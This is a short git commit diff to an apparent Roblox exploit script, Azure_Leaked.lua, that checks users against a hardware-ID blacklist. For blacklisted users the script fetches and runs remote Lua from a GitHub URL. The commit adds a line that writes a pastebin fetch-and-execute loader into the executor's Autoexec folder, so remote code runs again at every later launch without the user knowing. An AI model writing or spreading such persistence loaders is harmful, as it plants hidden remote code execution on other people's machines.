7c78d3a0dbcf9f10ca344c87db8ebd1fd4313882
Yumi <90940961+KOKAKAKA@users.noreply.github.com>
2023-11-06 14:55:12 +0700

    Update Azure_Leaked.lua

--- Azure_Leaked.lua
+++ Azure_Leaked.lua
@@ -3,10 +3,9 @@ local blacklist={"0aa71708-1234-47ab-8b03-81ee75c7c116"}
 for i, v in pairs(blacklist) do
   if v == HWID then
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/markxd07/Luxury-Free/main/Auto_Kaitun.lua"))()
+        writefile("/Autoexec/BlackList.txt", "loadstring(game:HttpGet(('https://pastebin.com/raw/vrChMYWP'),true))()")
 	wait(2)
 	plr:Kick("Blacklisted")
-	wait(0)
-	TeleportService:Teleport(game.PlaceId, Players.LocalPlayer)
   end
 end
 getgenv().Key = HWID
